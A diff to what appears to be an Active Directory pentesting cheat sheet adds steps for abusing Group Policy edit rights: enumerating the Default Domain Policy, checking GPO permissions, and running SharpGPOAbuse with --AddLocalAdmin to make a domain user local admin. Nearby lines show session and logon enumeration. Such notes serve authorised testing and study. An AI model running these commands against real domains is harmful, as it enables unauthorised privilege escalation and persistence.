@@ -76,6 +76,13 @@
 3.  ``` Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl ``` view permissions of "NetSessionEnum" in registry path:``` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity ```
 -  registry key : ``` SrvsvcSessionInfo ```
 
+### Group Policy
+1. Check domain policy ``` Get-GPO -Name "Default Domain Policy" ```
+2. check user permission ``` Get-GPPermission -Guid {ID get from step 1} -TargetType User -TargetName {domain user name only} ```
+3. IF Saw GpoEdit permission: https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master
+4. run ``` .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {domain user name} --GPOName "Default Domain Policy" ```
+5. update policy ``` gpupdate /force ```
+
 ####  w/ psloggedon.exe
 -  req ``` Remote Registry ``` service & admin
 -  ``` .\PsLoggedon.exe \\files04 ``` check recent loggin activity on certain machine
